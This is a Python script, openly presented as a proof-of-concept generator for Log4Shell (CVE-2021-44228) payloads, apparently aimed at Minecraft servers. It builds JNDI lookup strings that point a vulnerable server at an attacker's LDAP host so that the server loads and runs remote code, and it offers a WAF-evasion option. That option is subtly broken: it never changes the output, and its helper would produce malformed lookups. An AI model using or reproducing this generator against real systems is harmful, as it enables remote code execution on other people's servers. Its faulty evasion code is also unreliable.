DEFAULT_PORT = 8000 # LDAP server

import argparse

class Logger:
    def success(message):
        print(f'\n\x1b[38;5;103m[$] \x1b[97m{message} \n')
    
    def error(message):
        print(f'\x1b[38;5;215m[!] \x1b[97m{message}')

    def verbose(message): 
        print(f'\x1b[38;5;31m[*] \x1b[97m{message}...')


class Application:

    BANNER = '''\x1b[91m
 .         . .  __..      ..
 |    _  _ |_| (__ |_  __ ||
 |___(_)(_]  | .__)| )(_/.|| 
        ._|                
\x1b[97m PoC script for \x1b[33mLog4Shell/CVE-2021-44228 \x1b[97mcommand generator by \x1b[38;5;31mchecksum\x1b[97m    
'''

    def print_banner():
        print(Application.BANNER)

class cmd:

    def bypass(mc_cmd):
        return mc_cmd.replace('ldap', "{lower:l" + '}' + "{lower:d" + '}'+ "{lower:a" + '}'+ "{lower:p" + '}')     

    def craft(host: str, port: int, bypass: bool, payload: str):
        if payload is None:
            payload = '#'
        else:
            pass

        cmd = str("${jndi:ldap://" + str(host) + ':' + str(port) + '/' + payload + '}')

        if not bypass:
            return cmd
        
        else:
            return cmd


def main():
    Application.print_banner()

    parser = argparse.ArgumentParser(usage='%(prog)s [options]')
    parser.error = Logger.error

    parser.add_argument('--payload', help='Payload to exec on MC server', dest='payload', metavar='')
    parser.add_argument('--port-ldap', help='Port of LDAP server', dest='ldap_port', metavar='', default=DEFAULT_PORT)
    parser.add_argument('--host-ldap', help='Host of LDAP server', dest='ldap_host', metavar='')
    parser.add_argument('--bypass', help='Attempt to bypass WAFs by obfuscating CMD payload', dest='bypass', action='store_true')

    args = parser.parse_args()

    Logger.verbose(f'LDAP server: `{args.ldap_host}:{args.ldap_port}`')

    if args.payload:
        Logger.verbose(f'Payload..: `{args.payload}`')

    Logger.success(f'Ready to go! Your Log4j JNDI payload: ' + cmd.craft(args.ldap_host, args.ldap_port, args.bypass, args.payload))


if __name__ == '__main__':
    main()